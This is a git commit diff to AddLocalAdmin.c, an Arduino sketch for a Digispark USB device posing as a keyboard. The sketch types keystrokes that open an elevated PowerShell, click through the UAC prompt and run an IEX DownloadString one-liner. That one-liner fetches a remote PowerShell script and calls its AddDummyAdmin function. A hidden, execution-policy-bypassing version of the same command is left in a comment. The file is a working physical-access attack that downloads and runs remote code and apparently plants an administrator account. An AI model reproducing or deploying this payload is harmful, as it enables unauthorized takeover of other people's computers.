b1592d02b77813c0a7b8b9fa1275650171989cbe
fugitivus <fugitivus@users.noreply.github.com>
2019-09-02 12:40:26 +0200

    Update AddLocalAdmin.c

--- AddLocalAdmin.c
+++ AddLocalAdmin.c
@@ -1,4 +1,10 @@
+
 #include "DigiKeyboardDe.h"
+
+#define KEY_UP_ARROW 0x52
+#define KEY_DOWN_ARROW 0x51
+#define KEY_LEFT_ARROW 0x50
+#define KEY_RIGHT_ARROW 0x4F
 
 void setup() 
 {
@@ -6,18 +12,30 @@ void setup()
 
   //Digispark Tastatur einmalige ausgabe:
   DigiKeyboardDe.update();
-  DigiKeyboardDe.delay(1000);
+  DigiKeyboardDe.delay(200);
   DigiKeyboardDe.sendKeyStroke(KEY_M, MOD_GUI_LEFT); //minimize all windows
-  DigiKeyboardDe.delay(2000);
+  DigiKeyboardDe.delay(200);
   DigiKeyboardDe.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
-  DigiKeyboardDe.delay(500);
-  //DigiKeyboardDe.println("powershell.exe");
-  DigiKeyboardDe.println("powershell.exe -NoP -sta -W Hidden -exec bypass \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/fugitivus/deftooth/master/deftooth.ps1');AddDummyAdmin\"");
+  DigiKeyboardDe.delay(200);
+  
+  //Run cmd as admin:
+  DigiKeyboardDe.println("powershell.exe Start-Process powershell.exe -Verb runAs");
+  //DigiKeyboardDe.print("powershell.exe");
+  //DigiKeyboardDe.sendKeyStroke(DE_MOD_CONTROL_LEFT, DE_MOD_SHIFT_LEFT);
+  //DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
+  //DigiKeyboardDe.sendKeyStroke(KEY_J, DE_MOD_ALT_LEFT);
+  DigiKeyboardDe.delay(2000);
+  DigiKeyboardDe.sendKeyStroke(KEY_LEFT_ARROW); 
+  DigiKeyboardDe.delay(1000);
+  DigiKeyboardDe.sendKeyStroke(KEY_ENTER); 
+  DigiKeyboardDe.delay(500);  
+  DigiKeyboardDe.println("IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/fugitivus/deftooth/master/deftooth.ps1');AddDummyAdmin");
 }
 
 void loop() 
 { 
-  //LED blinken wenn fertig...
+  //LED blinken wenn fertig...powershell.exe -NoP -sta -W Hidden -exec bypass "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/fugitivus/deftooth/master/deftooth.ps1');AddDummyAdmin"
+  
   digitalWrite(1, HIGH);
   DigiKeyboard.delay(200);
   digitalWrite(1, LOW);
